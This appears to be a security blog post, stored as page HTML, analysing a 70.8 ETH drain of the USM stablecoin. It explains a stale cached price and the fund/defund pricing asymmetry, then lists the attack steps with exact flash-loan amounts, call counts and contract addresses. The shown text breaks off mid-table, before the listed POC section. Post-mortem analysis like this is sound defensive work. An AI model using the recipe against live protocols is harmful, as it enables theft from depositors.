@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>USM Drained for 70.8 ETH by Funding 62M FUM Against a Price That Hadn&#39;t Been Refreshed in 99 Days - YINHUI&#39;s BLOG</title><meta name="author" content="yinhui">
+<meta name="description" content="On ETH block 25716150, one transaction took 132.59 ETH out of the USM pool and left 61.76. The exploit was a single fund() call followed by 64 equal-sized defund() calls, all inside one flash loan. Net profit: 70.830977 ETH. The oracle was never touched.
+Transaction: 0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e
+"><meta name="keywords" content='attack'>
+  <meta itemprop="name" content="USM drained for 70.8 ETH by funding 62M FUM against a price that hadn&#39;t been refreshed in 99 days">
+  <meta itemprop="description" content="On ETH block 25716150, one transaction took 132.59 ETH out of the USM pool and left 61.76. The exploit was a single fund() call followed by 64 equal-sized defund() calls, all inside one flash loan. Net profit: 70.830977 ETH. The oracle was never touched.
+Transaction: 0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e">
+  <meta itemprop="datePublished" content="2026-08-12T21:16:15+08:00">
+  <meta itemprop="dateModified" content="2026-08-12T21:16:15+08:00">
+  <meta itemprop="wordCount" content="2448">
+  <meta itemprop="image" content="https://yinhui1984.github.io/images/avatar.png">
+  <meta itemprop="keywords" content="Attack"><meta property="og:url" content="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/">
+  <meta property="og:site_name" content="YINHUI&#39;s BLOG">
+  <meta property="og:title" content="USM drained for 70.8 ETH by funding 62M FUM against a price that hadn&#39;t been refreshed in 99 days">
+  <meta property="og:description" content="On ETH block 25716150, one transaction took 132.59 ETH out of the USM pool and left 61.76. The exploit was a single fund() call followed by 64 equal-sized defund() calls, all inside one flash loan. Net profit: 70.830977 ETH. The oracle was never touched.
+Transaction: 0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-08-12T21:16:15+08:00">
+    <meta property="article:modified_time" content="2026-08-12T21:16:15+08:00">
+    <meta property="article:tag" content="Attack">
+    <meta property="og:image" content="https://yinhui1984.github.io/images/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://yinhui1984.github.io/images/avatar.png">
+  <meta name="twitter:title" content="USM drained for 70.8 ETH by funding 62M FUM against a price that hadn&#39;t been refreshed in 99 days">
+  <meta name="twitter:description" content="On ETH block 25716150, one transaction took 132.59 ETH out of the USM pool and left 61.76. The exploit was a single fund() call followed by 64 equal-sized defund() calls, all inside one flash loan. Net profit: 70.830977 ETH. The oracle was never touched.
+Transaction: 0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e">
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" data-light="#ffffff" data-dark="#ffffff" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://yinhui1984.github.io/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days/" title="USM drained for 70.8 ETH by funding 62M FUM against a price that hadn&#39;t been refreshed in 99 days - YINHUI&#39;s BLOG" /><link rel="prev" type="text/html" href="https://yinhui1984.github.io/metamask-agent-wallets-guard-mode-checks-four-things-the-approve-amount-isnt-one-of-them/" title="MetaMask Agent Wallet&#39;s Guard Mode Checks Four Things. The approve() Amount Isn&#39;t One of Them" /><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "USM drained for 70.8 ETH by funding 62M FUM against a price that hadn't been refreshed in 99 days",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/yinhui1984.github.io\/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days\/"
+    },"image": ["https:\/\/yinhui1984.github.io\/images\/avatar.png"],"genre": "posts","keywords": "attack","wordcount":  2448 ,
+    "url": "https:\/\/yinhui1984.github.io\/usm-drained-for-70.8-eth-by-funding-62m-fum-against-a-price-that-hadnt-been-refreshed-in-99-days\/","datePublished": "2026-08-12T21:16:15+08:00","dateModified": "2026-08-12T21:16:15+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "yinhui"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="fixed" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/">首页</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="切换主题" title="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item"><a class="menu-link" href="/">首页</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>USM Drained for 70.8 ETH by Funding 62M FUM Against a Price That Hadn&#39;t Been Refreshed in 99 Days</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      yinhui</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/security/" class="post-category" title="分类 - Security"><i class="fa-regular fa-folder" aria-hidden="true"></i> Security</a></span></div><div class="post-meta-line"><span title="发布于 2026-08-12 21:16:15"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-08-12">2026-08-12</time></span>&nbsp;<span title="2448 字"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>约 2500 字</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>预计阅读 12 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-protocol">The protocol</a></li>
+    <li><a href="#two-prices-and-only-one-of-them-is-fresh">Two prices, and only one of them is fresh</a></li>
+    <li><a href="#the-asymmetry-that-turns-a-refresh-into-money">The asymmetry that turns a refresh into money</a></li>
+    <li><a href="#the-attack">The attack</a></li>
+    <li><a href="#reproduction">Reproduction</a></li>
+    <li><a href="#why-the-redemption-was-split-into-64">Why the redemption was split into 64</a></li>
+    <li><a href="#why-this-is-worth-a-note-beyond-the-160k">Why this is worth a note beyond the $160k</a></li>
+    <li><a href="#poc">POC</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>On ETH block 25716150, one transaction took 132.59 ETH out of the USM pool and left 61.76. The exploit was a single <code>fund()</code> call followed by 64 equal-sized <code>defund()</code> calls, all inside one flash loan. Net profit: 70.830977 ETH. The oracle was never touched.</p>
+<p>Transaction: <code>0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e</code></p>
+<h2 class="heading-element" id="the-protocol"><span>The protocol</span>
+  <a href="#the-protocol" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>USM (Minimalist USD v1) is an ETH-backed stablecoin with two tokens over one pool. USM holders hold a fixed-value claim (1 USM ≈ $1 of ETH), FUM holders hold the residual — the pool minus the USM liability, divided by FUM supply. Classic senior/junior split, <code>MAX_DEBT_RATIO</code> caps the senior side at 80% of pool value.</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>contract</th>
+            <th>address</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>USM (pool, holds all ETH)</td>
+            <td><code>0x2a7FFf44C19f39468064ab5e5c304De01D591675</code></td>
+        </tr>
+        <tr>
+            <td>FUM (equity token, owned by USM)</td>
+            <td><code>0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3</code></td>
+        </tr>
+        <tr>
+            <td>MedianOracle (price source)</td>
+            <td><code>0x7F360C88CABdcC2F2874Ec4Eb05c3D47bD0726C5</code></td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>MedianOracle takes the median of three sources: the Chainlink ETH/USD feed (<code>0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419</code>) and 10-minute TWAPs from two deep Uniswap V3 pools, USDC/WETH 0.05% (<code>0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640</code>) and WETH/USDT 0.05% (<code>0x11b815efB8f581194ae79006d24E0d814B7697F6</code>).</p>
+<p>At the block before the attack (25716149), the system was small and quiet: <code>ethPool</code> = 132.588942983107019337 ETH, USM supply = 200,251.453135834662058063, FUM supply = 329,463.502710697641576863. Debt ratio 66.89%, not underwater. Five USM holders, 32 FUM holders, all EOAs — no pool, no lending protocol, no bridge ever held either token.</p>
+<h2 class="heading-element" id="two-prices-and-only-one-of-them-is-fresh"><span>Two prices, and only one of them is fresh</span>
+  <a href="#two-prices-and-only-one-of-them-is-fresh" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>The contract keeps two price slots in <code>storedState</code>:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">storedState.ethUsdPrice      // the mid price the system actually prices with
+</span></span><span class="line"><span class="cl">storedState.oracleEthUsdPrice // the last oracle reading it accepted, for comparison only</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>Every operation (<code>mint</code>/<code>burn</code>/<code>fund</code>/<code>defund</code>) starts by calling <code>checkForFreshOraclePrice</code>:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">oraclePrice</span> <span class="o">=</span> <span class="n">oracle</span><span class="p">.</span><span class="n">latestPrice</span><span class="p">()</span> <span class="o">+</span> <span class="n">HALF_TRILLION</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">unchecked</span> <span class="p">{</span> <span class="n">oraclePrice</span> <span class="o">=</span> <span class="n">oraclePrice</span> <span class="o">/</span> <span class="n">TRILLION</span> <span class="o">*</span> <span class="n">TRILLION</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">oraclePrice</span> <span class="o">==</span> <span class="n">ls</span><span class="p">.</span><span class="n">oracleEthUsdPrice</span><span class="p">)</span> <span class="p">{</span>          <span class="c1">// unchanged since last time
+</span></span></span><span class="line"><span class="cl">    <span class="n">price</span> <span class="o">=</span> <span class="n">ls</span><span class="p">.</span><span class="n">ethUsdPrice</span><span class="p">;</span>                          <span class="c1">// keep the stored mid
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">price</span> <span class="o">=</span> <span class="n">oraclePrice</span><span class="p">;</span>                             <span class="c1">// adopt the fresh reading
+</span></span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>So the stored mid only changes in two ways: a mint/burn/fund/defund pushes it with <code>wadMulDown</code>/<code>wadMulUp</code>, or the oracle returns a value that differs from the cached <code>oracleEthUsdPrice</code>, in which case the fresh oracle price replaces it outright. The mid has no time-based decay of its own. <code>bidAskAdjustment</code> does decay (half-life about a minute, zero after 600 seconds), but the mid doesn&rsquo;t.</p>
+<p>At block 25716149 the cache said: <code>ethUsdPrice</code> = $2257.793612, <code>oracleEthUsdPrice</code> = $2304.031122. The timestamp on <code>bidAskAdjustment</code> was <code>1777691195</code> — 2026-05-02 03:06:35 UTC. That&rsquo;s 8,571,960 seconds, or 99.2 days, before the attack block. No one had called any of the four functions in 99 days. The last real activity was a 1.5-hour window in May 2026; before that the protocol had been near-silent since 2023 (the <code>PriceChanged</code> event count by year: 40, 148, 17, 2, 2, 10).</p>
+<p>Here&rsquo;s the part that matters: in those 99 days the median oracle kept moving — Chainlink and the two TWAP pools price the real market, they don&rsquo;t wait for USM users. By block 25716149 the live median read $1921.81, about 16.6% below the cached <code>oracleEthUsdPrice</code>. The system just had no idea, because nobody had called it.</p>
+<h2 class="heading-element" id="the-asymmetry-that-turns-a-refresh-into-money"><span>The asymmetry that turns a refresh into money</span>
+  <a href="#the-asymmetry-that-turns-a-refresh-into-money" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>fund()</code> and <code>defund()</code> read the price through <code>adjustedEthUsdPrice</code>, and the two sides are not symmetric:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">side</span> <span class="o">==</span> <span class="n">IUSM</span><span class="p">.</span><span class="n">Side</span><span class="p">.</span><span class="n">Buy</span> <span class="o">?</span> <span class="p">(</span><span class="n">adjustment</span> <span class="o">&gt;</span> <span class="n">WAD</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="n">adjustment</span> <span class="o">&lt;</span> <span class="n">WAD</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">price</span> <span class="o">=</span> <span class="n">price</span><span class="p">.</span><span class="n">wadMul</span><span class="p">(</span><span class="n">adjustment</span><span class="p">,</span> <span class="p">...);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><code>fund()</code> prices on the Buy side: when <code>bidAskAdjustment &gt; 1</code> it multiplies the mid up. <code>defund()</code> prices on the Sell side: it only adjusts when <code>bidAskAdjustment &lt; 1</code>, and otherwise uses the bare mid. The math inside <code>_fundFum</code> then pushes both the mid and the adjustment up (<code>wadMulUp</code> by a growth factor tied to how much the pool grew). So a large <code>fund()</code> raises the very mid that a later <code>defund()</code> reads without any adjustment. That&rsquo;s the mirror image of the better-known mint/burn relationship, and it means a single actor can push the price up with a <code>fund()</code> and collect the full, unadjusted push with <code>defund()</code>.</p>
+<p>The stale price is what makes the push cheap. When the first <code>fund()</code> in 99 days runs, <code>checkForFreshOraclePrice</code> fires for the first time in 99 days: the mid jumps from the cached $2257.79 down to the live $1921.81. A 14.9% drop in the ETH/USD mid is a 14.9% drop in the USD value of each FUM claim denominator — the buffer (pool minus USM liability) shrinks, FUM gets priced cheaper for the buyer. The attacker then buys a huge amount of FUM at that suddenly-cheap price.</p>
+<h2 class="heading-element" id="the-attack"><span>The attack</span>
+  <a href="#the-attack" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ol>
+<li>Flash loan 11,579.978354608392803524 ETH from Morpho — about 87x the entire pool.</li>
+<li>Unwrap to ETH, one call to <code>USM.fund(attacker, 0)</code> with all of it. This is the first interaction in 99 days: the mid is refreshed to $1921.81, the pool grows to ~11,712 ETH, and the attacker is minted 62,184,299.03 FUM.</li>
+<li>Sixty-four equal <code>USM.defund(attacker, 971,629.67, 0)</code> calls — 62,184,299.03 divides exactly by 64. Each one redeems FUM for ETH at the pushed-up price, the pool shrinking a step at a time.</li>
+<li>Loop until <code>FUM.balanceOf(attacker) == 0</code>. Wrap back to WETH, repay the flash loan.</li>
+<li>Left with 70.830977 ETH. Pool went from 132.588942983107019337 wei to 61,757,965,615,409,310,965 wei.</li>
+</ol>
+<p>No interaction with either Uniswap pool, no interaction with Chainlink. The median oracle was read passively, never manipulated. The price jump that made the math work was real market movement from 99 days of nobody asking.</p>
+<h2 class="heading-element" id="reproduction"><span>Reproduction</span>
+  <a href="#reproduction" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>I reproduced the payout against the contract&rsquo;s own public pure pricing functions (<code>fund()</code>&rsquo;s <code>fumFromFund</code>/<code>fumPrice</code> and <code>defund()</code>&rsquo;s <code>ethFromDefund</code>), feeding the state at block 25716149 and the same parameters: 11,579.978354608392803524 ETH funded, then 64 equal defund chunks. Result: profit of 70.830977367697708372 ETH (the chain shows 70.830977), final pool <code>61757965615409310965</code> wei — byte-for-byte identical to the real ending balance.</p>
+<h2 class="heading-element" id="why-the-redemption-was-split-into-64"><span>Why the redemption was split into 64</span>
+  <a href="#why-the-redemption-was-split-into-64" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>The 64-way split is not a stylistic choice; it&rsquo;s the difference between a profit and a loss of five thousand ETH. I ran both variants on the same fork, starting from the same 11,579.978354608392803524 ETH <code>fund()</code> and the same 62,184,299.03 FUM:</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>redemption</th>
+            <th>ETH out</th>
+            <th>net on the position</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>64 equal chunks (the real attack)</td>
+            <td>11,650.809331976090511896</td>
+            <td><strong>+70.830977367697708372</strong></td>
+        </tr>
